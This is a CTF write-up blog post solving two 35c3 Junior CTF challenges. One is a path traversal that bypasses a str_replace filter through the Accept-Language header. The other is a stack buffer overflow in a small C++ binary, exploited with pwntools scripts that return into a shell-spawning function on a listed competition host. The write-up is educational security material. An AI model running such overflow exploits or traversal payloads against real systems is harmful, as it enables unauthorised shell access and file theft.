+++
date = 2018-12-30T21:08:42-04:00
tags = ["web", "burp suite", "ctf", "php", "path traversal", "filter bypass"]
category = ["Capture the Flag Writeups"]
draft = false
title = "35c3 Junior CTF writeup"
+++
## 35c3 Junior CTF Pwn: flags
We are presented with the following web page:

![mainpage](/Mainpage.png)

Looking at the code on the page we see that it take the value of the 'Accept-Language' header and uses it to read and display the flag image.

Our goal is to provide the correct input to read the flag located at /flag on the filesystem.
When we input the value for a file that doesn't exist we get the following error:

![error](/Error.png)

This error shows that we are reading the flag images from /var/www/html/flag/.
Now we know that we need to go up 4 directories to read the flag.

Now all we have to do is bypass the str_replace call and preform a directory traversal to read the flag.

![Solution](/Solution.png)

## 35c3 Junior CTF Pwn: 1996
We are given a zip file containing the following files "1996" and "1996.cpp".
1996 is 64 bit ELF binary and 1996.cpp contains its corresponding source code.
During the ctf the target running the binary was at 35.207.132.47:22227.

1996.cpp:
```C++
// compile with -no-pie -fno-stack-protector

#include <iostream>
#include <unistd.h>
#include <stdlib.h>

using namespace std;

void spawn_shell() {
    char* args[] = {(char*)"/bin/bash", NULL};
    execve("/bin/bash", args, NULL);
}

int main() {
    char buf[1024];

    cout << "Which environment variable do you want to read? ";
    cin >> buf;

    cout << buf << "=" << getenv(buf) << endl;
}
```

This code contains a classic stack based buffer vulnerability. At "`cin >> buf;`" user input is read into buf without checking the length of the input. Our goal here is to use this vulnerability to take control of the program's execution flow and jump to the "spawn_shell" function to get a shell on the target.

We can exploit this by feeding the program a long enough input to overwrite the return pointer(rbp+0x8) on the stack with the address of "spawn_shell" and take control of execution pointer (rip) and jump to the code want to execute.

To figure out the length that our input needs to be we will generate a unique sequence of length 2000 to feed to the program. This unique sequence will allow us to figure out the exact length our input needs to be by looking at the value of the rip register when the program crashes.

Generate unique sequence:
```python
#!/usr/bin/env python
from pwn import *

# spawn process
sh = process('1996')
# read process out until we see a question mark followed by a space
print sh.recvline("? ")
# generate unique sequences of length 2000
payload = cyclic(2000)
# send payload to process as input
sh.sendline(payload)
# switch to interactive mode
sh.interactive()
```

The code above will crash the program with the main function returning to 0x6161616e6161616d. We take the last 4 bytes of this value and feed it to the function cyclic_find. This will give us the index (1048) in our unique sequence where the value was found. This index plus another 8 bytes for the address of spawn_shell is the total length our payload needs to be to take control of the program.

Next we disassemble the 1996 binary with radare2 to find the address of the spawn_shell function:
![spawn_shell address](/spawn_shell_addr.png)

With this information we are ready to write our exploit.

exploit:
```python
#!/usr/bin/env python
from pwn import *

sh = remote('35.207.132.47', 22227)
print sh.recvuntil("? ")

payload = cyclic(1048)+p64(0x00400897)

sh.sendline(payload)
sh.interactive()
```
Executing our exploit gives us the following:

![exploit result](/exploit_1996.png)
